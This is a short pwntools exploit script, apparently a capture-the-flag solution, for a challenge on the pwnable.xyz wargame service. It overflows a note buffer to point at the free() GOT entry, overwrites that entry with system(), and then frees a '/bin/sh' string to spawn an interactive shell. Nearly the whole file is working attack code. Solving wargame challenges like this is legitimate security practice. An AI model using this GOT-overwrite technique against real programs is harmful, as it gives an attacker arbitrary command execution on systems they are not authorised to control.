#!/usr/bin/python3
from pwn import *
elf = ELF("./challenge")

#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

#def bp_handler(event):
#    main_addr = debug_r.selected_frame().read_register("rdi")
#    print(main_addr)
#
#    ## stop catching breakpoints!
#    debug_r.events.stop.disconnect(bp_handler)

REMOTE = 1
DEBUG = 0

def edit_note(size, content):
    r.recvuntil(b"Exit\n> ")
    r.sendline(b"1")
    r.recvuntil(b"? ")
    r.sendline(str(size))
    r.recvuntil(b": ")
    r.sendline(content)

def edit_desc(content):
    r.recvuntil(b"Exit\n> ")
    r.sendline(b"2")
    r.recvuntil(b": ")
    r.sendline(content)

if REMOTE:
    r = remote("svc.pwnable.xyz", 30016)
elif DEBUG:
    gs = """
    #break *edit_desc + 70
    b *edit_note + 122
    continue
    continue
    """
    r = gdb.debug(elf.path, gdbscript=gs,)# api=True)
    #debug_r = r.gdb
else:
    r = process(elf.path)

edit_note(0x20 + 9, b"A" * 0x20 + p64(elf.got.free))

edit_desc(p64(elf.plt.system))

edit_note(0x20, b"/bin/sh\0")

r.interactive()